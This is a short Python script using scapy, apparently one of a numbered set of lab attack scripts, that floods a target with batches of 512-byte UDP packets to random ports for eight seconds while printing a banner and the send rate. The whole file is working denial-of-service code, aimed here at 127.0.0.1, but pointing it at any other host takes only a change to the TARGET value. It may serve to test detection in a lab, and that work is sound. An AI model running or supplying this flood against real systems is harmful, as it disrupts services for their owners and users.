#!/usr/bin/env python3
"""
Attack 5: UDP Flood — VMware Edition
"""
from scapy.all import IP, UDP, send, RandShort, conf
import time

conf.verb = 0

TARGET   = "127.0.0.1"
DURATION = 8
BATCH    = 400

print(f"""
╔══════════════════════════════════════╗
║           UDP FLOOD ATTACK           ║
║  Target  : {TARGET:<27}║
║  Duration: {DURATION} seconds                ║
╚══════════════════════════════════════╝
""")

total = 0
start = time.time()

while time.time() - start < DURATION:
    pkts = [
        IP(dst=TARGET) / UDP(sport=RandShort(), dport=RandShort()) / ("X"*512)
        for _ in range(BATCH)
    ]
    send(pkts, verbose=False)
    total += BATCH
    elapsed = time.time() - start
    print(f"  [{elapsed:>4.1f}s]  {total:>8,} UDP packets  "
          f"({total/elapsed:>6,.0f}/s)", end="\r")

print(f"\n\n  Done. {total:,} UDP packets sent.\n")
